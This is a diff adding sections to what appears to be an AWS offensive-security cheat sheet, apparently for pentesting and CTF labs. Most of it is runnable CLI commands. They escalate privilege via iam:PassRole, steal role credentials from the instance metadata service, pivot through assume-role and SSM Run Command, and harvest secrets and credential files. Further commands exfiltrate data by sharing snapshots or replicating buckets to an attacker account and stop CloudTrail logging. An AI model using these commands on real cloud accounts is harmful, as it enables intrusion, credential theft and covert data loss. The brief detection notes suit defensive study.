@@ -133,6 +133,11 @@ aws iam create-policy-version --policy-arn arn --policy-document file://admin.js
 
 # 5. Lambda function with privileged role
 aws lambda update-function-code --function-name func --zip-file fileb://payload.zip
+
+# 6. iam:PassRole + a service that runs code — pass an existing admin role to code you control
+aws lambda create-function --function-name x --runtime python3.12 --handler x.h \
+  --role <ADMIN_ROLE_ARN> --zip-file fileb://f.zip      # needs iam:PassRole + lambda:CreateFunction, then invoke
+aws ec2 run-instances --image-id <AMI> --iam-instance-profile Arn=<ADMIN_PROFILE>  # then read its creds via IMDS
 ```
 
 ### Pacu (AWS exploitation framework)
@@ -161,6 +166,57 @@ run lambda__enum
 # Privilege escalation
 run iam__privesc_scan
 ```
+
+### Lateral movement — assume roles, run commands
+
+Cloud pivoting is identity-to-identity: read a credential, reuse it, repeat.
+
+```bash
+# Read the instance role straight from the metadata service (on-box code, or an SSRF that reaches it)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/          # role name
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>    # key, secret, token
+# IMDSv2 first needs a session token (PUT); a hop limit of 1 blocks most SSRF
+TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
+
+# Step into another role, including cross-account; chain role -> role as the trust policies allow
+aws sts assume-role --role-arn <ROLE_ARN> --role-session-name s
+
+# Systems Manager Run Command: execute on managed instances with no SSH (needs ssm:SendCommand)
+aws ssm send-command --document-name AWS-RunShellScript \
+  --targets Key=instanceIds,Values=<INSTANCE_ID> --parameters commands='id'
+aws ssm list-command-invocations --command-id <ID> --details                    # read the output
+
+# Reuse credentials that are already lying around
+printenv | grep -i AWS_
+aws ssm get-parameters-by-path --path / --recursive --with-decryption
+aws secretsmanager get-secret-value --secret-id <NAME>
+cat ~/.aws/credentials
+```
+
+### Exfiltration — often a share, not a download
+
+The quietest channels create no data-plane egress on the victim side.
+
+```bash
+# Share a snapshot to an attacker account, then restore your own copy there
+aws ec2 modify-snapshot-attribute --snapshot-id <SNAP> --attribute createVolumePermission \
+  --operation-type add --user-ids <ATTACKER_ACCOUNT_ID>
+aws rds modify-db-snapshot-attribute --db-snapshot-identifier <SNAP> \
+  --attribute-name restore --values-to-add <ATTACKER_ACCOUNT_ID>
+
+# Presigned URL turns a private object into a link anyone can fetch
+aws s3 presign s3://<BUCKET>/<KEY> --expires-in 3600
+
+# Let the platform move it: cross-account bucket replication to an attacker-owned bucket
+aws s3api put-bucket-replication --bucket <BUCKET> --replication-configuration file://repl.json
+```
+
+Detection tell: the control-plane event (`ModifySnapshotAttribute`, a new replication rule), not the byte count.
+
+### Defense evasion — logging blind spots
+
+- `aws cloudtrail stop-logging` / `delete-trail` / a selective `update-trail` halt or narrow recording; the call is itself logged, so it is a high-value alert.
+- A region or account with no trail or no GuardDuty is unmonitored, and trails do not record S3 object-level reads unless data events are enabled.
 
 ### LocalStack-backed cloud challenges
 
